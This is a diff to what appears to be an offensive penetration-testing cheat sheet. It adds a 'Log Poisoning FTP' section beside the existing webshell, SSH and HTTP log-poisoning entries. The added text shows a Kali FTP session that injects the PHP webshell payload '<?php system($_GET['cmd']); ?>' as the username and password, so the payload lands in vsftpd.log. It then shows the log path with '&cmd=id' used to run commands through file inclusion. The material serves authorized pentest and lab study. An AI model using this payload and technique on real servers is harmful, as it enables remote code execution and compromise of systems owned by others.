@@ -11,6 +11,7 @@
   * [<kbd>PHP WebShell</kbd>](#PHP-WebShell)
   * [<kbd>Log Poisoning WebShell</kbd>](#Log-Poisoning-WebShell)
       * [<kbd>SSH</kbd>](#Log-Poisoning-SSH)
+      * [<kbd>FTP</kbd>](#Log-Poisoning-FTP)
       * [<kbd>HTTP</kbd>](#Log-Poisoning-HTTP)
 - [<kbd>UnrealIRCd</kbd>](#UnrealIRCd)
 - [<kbd>Shellshock</kbd>](#Shellshock)
@@ -140,7 +141,27 @@
   > /var/log/auth.log&cmd=id
   
   ---
+   
+  # <kbd>Log Poisoning FTP</kbd>
   
+  > /var/log/vsftpd.log
+
+  ```php
+  root@kali:~# ftp 192.168.1.3
+  Connected to 192.168.1.3.
+  220 (vsFTPd 3.0.3)
+  Name (192.168.1.2:kali): <?php system($_GET['cmd']); ?>
+  331 Please specify the password.
+  Password: <?php system($_GET['cmd']); ?>
+  530 Login incorrect.
+  Login failed.
+  ftp> 
+   
+  ```
+  
+  > /var/log/vsftpd.log&cmd=id
+   
+  ---
   # <kbd>Log Poisoning HTTP</kbd>
 
   > /var/log/apache2/access.log
